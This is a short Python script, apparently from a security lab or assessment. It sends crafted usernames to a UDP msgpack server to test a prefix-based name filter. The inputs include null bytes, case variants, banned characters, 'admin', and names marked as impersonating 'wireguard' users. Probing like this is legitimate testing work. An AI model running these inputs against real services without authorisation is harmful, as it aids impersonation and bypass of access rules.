import socket, msgpack, random, time
HOST, PORT = 'csc4026z.link', 51825

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    s.send(msgpack.packb({'request_type': 1, 'request_handle': random.randrange(1, 2**32)}))
    r = msgpack.unpackb(s.recv(4096), raw=True)
    return s, r[b'session']

def req(s, msg):
    s.send(msgpack.packb(msg))
    try: return msgpack.unpackb(s.recv(4096), raw=True)
    except socket.timeout: return None

def h(): return random.randrange(1, 2**32)

print('=== PROBE 03: Username Prefix Bypass ===\n')
sock, sess = connect()

names = [
    ('Clear-test',           'capital C'),
    ('CLEAR-test',           'all caps'),
    ('clear_test',           'underscore not dash'),
    (' clear-test',          'leading space'),
    ('clear-',               'prefix only'),
    ('clear--test',          'double dash'),
    ('\x00clear-test',       'null byte prefix'),
    ('clEar-test',           'mixed case'),
    ('cle\x61r-test',        'hex-encoded a in clear'),
    ('',                     'empty string'),
    (':clear-test',          'leading colon (banned char)'),
    ('clear-test:',          'trailing colon'),
    ('clear-te:st',          'colon in middle'),
    ('wireguard-test',       'wireguard prefix (impersonate)'),
    ('wg-test',              'wg prefix'),
    ('admin',                'admin with no prefix'),
    ('clear-' + 'a'*14,      'exactly 20 chars'),
    ('clear-' + 'a'*15,      '21 chars (over limit)'),
    ('\tclear-test',         'tab prefix'),
    ('clear\x00-test',       'null in clear keyword'),
]

for name, label in names:
    r = req(sock, {'request_type': 13, 'session': sess, 'request_handle': h(), 'username': name})
    rtype = r.get(b'response_type') if r else None
    err   = r.get(b'error', b'').decode(errors='replace')[:60] if r else ''
    stored = r.get(b'new_username', b'').decode(errors='replace') if r else ''
    ok = rtype == 34
    print(f'  {"!!" if ok else "  "} {label}: {"ACCEPTED" if ok else "REJECTED"} {err}')
    if ok:
        print(f'       stored as: {repr(stored)}')
    time.sleep(0.15)

sock.close()
print('\nDone.')
